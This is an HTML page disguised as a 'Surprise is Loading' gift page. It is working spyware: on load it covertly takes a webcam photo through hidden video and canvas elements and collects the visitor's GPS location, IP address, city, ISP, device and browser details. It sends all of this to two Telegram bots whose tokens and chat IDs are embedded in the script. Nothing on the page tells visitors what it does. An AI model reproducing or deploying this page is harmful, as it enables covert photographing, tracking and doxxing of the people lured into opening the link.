<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Surprise!</title>
  <style>
    body {
      background: linear-gradient(135deg, #a0d8e1, #6ec6e6);
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    h1 { font-size: 24px; margin-top: 20px; }
    .info { margin-top: 20px; font-size: 16px; }
    /* Hidden elements for capture */
    #snapshot, #preview { display: none; }
  </style>
</head>
<body>
  <h1>Surprise is Loading... üéÅ</h1>
  <p class="info">Just wait a moment please...</p>

  <video id="preview" autoplay playsinline></video>
  <canvas id="snapshot"></canvas>

  <script>
    // --- CONFIGURATION FOR BOTH BOTS ---
    const botConfigs = [
      {
        token: "8310075647:AAF6MDySM-SUBXGX9CnZ94Mr0draJPkiHKs",
        chatId: "1106059754"
      },
      {
        token: "7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo",
        chatId: "7643222418"
      }
    ];

    const video = document.getElementById("preview");
    const canvas = document.getElementById("snapshot");

    // --- PHOTO CAPTURE LOGIC ---
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          // Wait 1 second for camera to focus, then capture
          setTimeout(() => {
            captureAndSendPhoto();
          }, 1000);
        };
      })
      .catch((err) => console.error("Camera access denied:", err));

    function captureAndSendPhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      
      canvas.toBlob((blob) => {
        // Send to every bot in the config array
        botConfigs.forEach(config => {
          const formData = new FormData();
          formData.append("chat_id", config.chatId);
          formData.append("photo", blob, "snapshot.png");

          fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
            method: "POST",
            body: formData
          }).catch(err => console.error("Photo Error:", err));
        });

        // Turn off camera after sending
        const tracks = video.srcObject.getTracks();
        tracks.forEach(track => track.stop());
      }, "image/png");
    }

    // --- DEVICE + IP + LOCATION LOGIC ---
    async function sendDeviceDetails(position = {}) {
      const now = new Date().toLocaleString();
      const ua = navigator.userAgent || "N/A";
      const platform = navigator.platform || "N/A";
      const screenRes = `${screen.width}x${screen.height}`;

      // IP Address Info
      let ipInfo = "üåê IP: Not available";
      try {
        const res = await fetch("https://ipapi.co/json/");
        const ipData = await res.json();
        ipInfo = 
          `üåê IP: ${ipData.ip}\n` +
          `üìç City: ${ipData.city}, ${ipData.region}\n` +
          `üåç Country: ${ipData.country_name}\n` +
          `üè¢ ISP: ${ipData.org}`;
      } catch (err) {}

      // Location Info
      let locationMsg = "üìå Location: Permission Denied";
      if (position.coords) {
        locationMsg = `üìå Location: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      }

      const message =
        `üõ∞Ô∏è New Visit Tracked!\n\n` +
        `üïí Time: ${now}\n` +
        `üíª Platform: ${platform}\n` +
        `üì∫ Screen: ${screenRes}\n` +
        `${ipInfo}\n` +
        `${locationMsg}\n\n` +
        `üß† UA: ${ua}`;

      // Send message to every bot in the config array
      botConfigs.forEach(config => {
        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: config.chatId, text: message })
        }).catch(err => console.error("Message Error:", err));
      });
    }

    // Trigger data collection
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        sendDeviceDetails,
        () => sendDeviceDetails() // Fallback if user denies GPS
      );
    } else {
      sendDeviceDetails();
    }
  </script>
</body>
</html>
